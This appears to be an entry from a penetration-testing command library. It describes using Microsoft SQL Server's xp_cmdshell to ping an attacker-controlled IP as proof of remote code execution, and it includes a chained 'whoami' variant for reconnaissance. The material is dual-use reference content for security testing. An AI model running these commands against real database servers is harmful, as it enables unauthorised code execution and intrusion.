---
id: cmd-xp_cmdshell-ping
data: EXEC xp_cmdshell 'ping -n 1 192.168.1.100';
tags:
  - rce
  - mssql
type: command
output: 'Ping response from server to attacker IP, confirming execution.'
executor: sql
platforms:
  - Microsoft SQL Server
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.083Z'
verified: false
validated: true
submitted: true
---
# xp_cmdshell-ping-demo

## Command

```sql
EXEC xp_cmdshell 'ping -n 1 192.168.1.100';
```

## Description

This SQL command invokes xp_cmdshell to execute a ping from the server to the attacker's IP, demonstrating remote code execution capability safely without data modification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `xp_cmdshell` | Extended proc for OS command execution | Yes |
| `ping -n 1 <IP>` | Windows ping command with count 1 to specified IP | Yes |

## Examples

### Basic Usage

```sql
EXEC xp_cmdshell 'ping -n 1 192.168.1.100';
```

### Advanced Usage

```sql
EXEC xp_cmdshell 'ping -n 1 192.168.1.100 && whoami';
```

## Expected Output

No direct SQL output, but network capture shows ICMP echo request/reply from the production server IP to the target IP, verifying command ran.

## Related

- [[Related Procedure: Execute RCE via xp_cmdshell]]
